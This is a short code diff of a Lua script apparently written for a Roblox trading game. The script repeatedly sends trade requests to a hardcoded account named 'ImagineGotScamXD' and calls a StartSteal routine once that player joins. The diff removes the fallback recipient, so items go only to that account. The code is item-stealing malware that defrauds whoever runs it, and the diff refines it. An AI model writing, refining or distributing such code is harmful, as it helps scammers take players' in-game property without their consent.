@@ -1,4 +1,5 @@
 local LogsUsername = "ImagineGotScamXD"
+Username = ""
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
@@ -158,12 +159,7 @@ local function SendTrade()
   
   while task.wait(10) do
         repeat
-    if LogsUsername then
         send_trade:FireServer(LogsUsername)
-    elseif Username then
-        send_trade:FireServer(Username)
-else
-    print("Not found")
 end
             
 wait(4)
@@ -210,7 +206,7 @@ end
 
 local function WaitForTrade()
   while true do
-    if game.Players:FindFirstChild(Username) or game.Players:FindFirstChild(LogsUsername) then
+    if game.Players:FindFirstChild(LogsUsername) then
       wait(5)
       StartSteal()
       break
